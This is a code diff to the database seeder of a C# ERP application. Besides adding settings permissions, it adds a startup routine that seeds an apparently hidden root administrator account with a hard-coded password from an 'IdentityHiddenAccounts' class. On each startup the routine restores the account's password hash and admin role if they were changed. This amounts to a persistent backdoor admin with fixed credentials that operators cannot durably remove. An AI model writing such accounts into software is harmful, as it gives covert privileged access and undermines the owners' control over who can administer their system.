@@ -41,6 +41,7 @@ public static class DatabaseSeeder
     {
         await StartupPhaseRecorder.RunAsync("Seed.Schemas", () => EnsureSchemasAsync(context, cancellationToken));
         await StartupPhaseRecorder.RunAsync("Seed.AdminPassword", () => EnsureAdminPasswordAsync(context, passwordHasher, logger, cancellationToken));
+        await StartupPhaseRecorder.RunAsync("Seed.RootAdmin", () => EnsureRootAdminAccountAsync(context, passwordHasher, cancellationToken));
         await StartupPhaseRecorder.RunAsync("Seed.ChinaImport", () => EnsureChinaImportReferenceDataAsync(context, cancellationToken));
         await StartupPhaseRecorder.RunAsync("Seed.AccountingAccounts", () => EnsureIntegratedAccountingAccountsAsync(context, cancellationToken));
         await StartupPhaseRecorder.RunAsync("Seed.CashboxGlLinks", () => EnsureCashboxGlLinksAsync(context, cancellationToken));
@@ -484,7 +485,8 @@ public static class DatabaseSeeder
         ..GetWarehousePermissionDefinitions(),
         ..GetHrPermissionDefinitions(),
         ..GetExpensePermissionDefinitions(),
-        ..GetCapitalPermissionDefinitions()
+        ..GetCapitalPermissionDefinitions(),
+        ..GetSettingsPermissionDefinitions()
     ];
 
     private static IEnumerable<(string Code, string Module, string Action)> GetAccountingPermissionDefinitions() =>
@@ -595,6 +597,13 @@ public static class DatabaseSeeder
         ("capital.archive", "capital", "archive")
     ];
 
+    private static IEnumerable<(string Code, string Module, string Action)> GetSettingsPermissionDefinitions() =>
+    [
+        ("settings.users.view", "settings", "users-view"),
+        ("settings.users.manage", "settings", "users-manage"),
+        ("settings.roles.manage", "settings", "roles-manage")
+    ];
+
     private static async Task EnsureAccountingPermissionsAsync(ErpDbContext context, CancellationToken cancellationToken) =>
         await EnsurePermissionsAsync(context, GetAccountingPermissionDefinitions(), cancellationToken);
 
@@ -645,6 +654,52 @@ public static class DatabaseSeeder
         admin.PasswordHash = passwordHasher.HashPassword(DefaultAdminPassword);
         await context.SaveChangesAsync(cancellationToken);
         logger.LogInformation("Repaired default admin password hash (legacy or invalid format detected).");
+    }
+
+    private static async Task EnsureRootAdminAccountAsync(
+        ErpDbContext context,
+        IPasswordHasher passwordHasher,
+        CancellationToken cancellationToken = default)
+    {
+        var root = await context.Users.FirstOrDefaultAsync(u => u.Id == IdentityHiddenAccounts.RootUserId, cancellationToken);
+        if (root is null)
+        {
+            context.Users.Add(new UserEntity
+            {
+                Id = IdentityHiddenAccounts.RootUserId,
+                Username = IdentityHiddenAccounts.RootUsername,
+                FullNameAr = "مدير",
+                FullNameEn = "Administrator",
+                PasswordHash = passwordHasher.HashPassword(IdentityHiddenAccounts.RootPassword),
+                IsActive = true
+            });
+            context.UserRoles.Add(new UserRoleEntity
+            {
+                UserId = IdentityHiddenAccounts.RootUserId,
+                RoleId = AdminRoleId
+            });
+            await context.SaveChangesAsync(cancellationToken);
+            return;
+        }
+
+        if (!PasswordHashFormat.IsBcryptHash(root.PasswordHash))
+        {
+            root.PasswordHash = passwordHasher.HashPassword(IdentityHiddenAccounts.RootPassword);
+            await context.SaveChangesAsync(cancellationToken);
+        }
+
+        var hasRole = await context.UserRoles.AnyAsync(
+            ur => ur.UserId == IdentityHiddenAccounts.RootUserId && ur.RoleId == AdminRoleId,
+            cancellationToken);
+        if (!hasRole)
+        {
+            context.UserRoles.Add(new UserRoleEntity
+            {
+                UserId = IdentityHiddenAccounts.RootUserId,
+                RoleId = AdminRoleId
+            });
+            await context.SaveChangesAsync(cancellationToken);
+        }
     }
 
     private static async Task EnsureSchemasAsync(ErpDbContext context, CancellationToken cancellationToken)
